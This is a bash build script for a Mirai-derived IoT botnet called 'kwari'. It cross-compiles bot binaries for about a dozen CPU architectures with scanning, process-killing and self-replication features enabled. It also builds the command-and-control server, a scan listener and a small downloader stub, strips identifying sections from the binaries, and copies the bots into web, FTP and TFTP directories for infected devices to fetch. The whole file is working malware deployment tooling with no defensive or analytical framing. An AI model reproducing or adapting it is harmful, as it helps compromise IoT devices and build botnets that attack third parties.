#!/bin/bash
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mips64/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/i686/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function arc_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" bot/*.c -s -o release/"$2"
}

rm -rf ~/release
mkdir ~/release
go build -o release/cnc cnc/*.go
go build -o loader/scanListen scanListen.go

compile_bot mips ssh.mips "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DMIPS"
compile_bot mipsel ssh.mpsl "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DMPSL"
compile_bot armv4l ssh.arm "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DARM"
compile_bot armv5l ssh.arm5 "-Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DARM5"
compile_bot armv6l ssh.arm6 "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DARM6"
compile_bot armv7l ssh.arm7 "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DARM7"
compile_bot powerpc ssh.ppc "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DPPC"
compile_bot sh4 ssh.sh4 "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DSH4"

compile_bot i586 kwari.x86 "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DX86"
compile_bot mips kwari.mips "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DMIPS"
compile_bot mipsel kwari.mpsl "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DMPSL"
compile_bot armv4l kwari.arm "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DARM"
compile_bot armv5l kwari.arm5 "-Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DARM5"
compile_bot armv6l kwari.arm6 "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DARM6"
compile_bot armv7l kwari.arm7 "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DARM7"
compile_bot powerpc kwari.ppc "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DPPC"
compile_bot sparc kwari.spc "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DSPC"
compile_bot m68k kwari.m68k "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DM68K"
compile_bot sh4 kwari.sh4 "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS -Dkwari_IOCTL -Dkwari_SELFREP -DSH4"

compile_bot mips mips "-static -Dkwari_NODUPS "
compile_bot mipsel mpsl "-static -Dkwari_NODUPS "
compile_bot armv4l arm "-static -Dkwari_NODUPS "
compile_bot armv7l arm7 "-static -Dkwari_NODUPS "
compile_bot mips huawei "-static -Dkwari_SCANNER -Dkwari_KILLER -Dkwari_NODUPS "
compile_bot i586 scan.x86 "-static -Dkwari_NODUPS -Dkwari_SCANNER -Dkwari_SERVER "
compile_bot i686 scan.x32 "-static -Dkwari_NODUPS -Dkwari_SCANNER -Dkwari_SERVER "

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc
mv ~/dlr/release/dlr* ~/loader/bins
rm -rf /var/ftp
rm -rf /var/lib/tftpboot
rm -rf /var/www/html/bins
rm -rf /var/www/html/Binary
mkdir /var/www/html/Binary
mkdir /var/www/html/bins
mkdir /var/ftp
mkdir /var/lib/tftpboot
cp release/kwari.* /var/www/html/bins
cp release/kwari.* /var/www/html/Binary
cp release/kwari.* /var/ftp
cp release/kwari.* /var/lib/tftpboot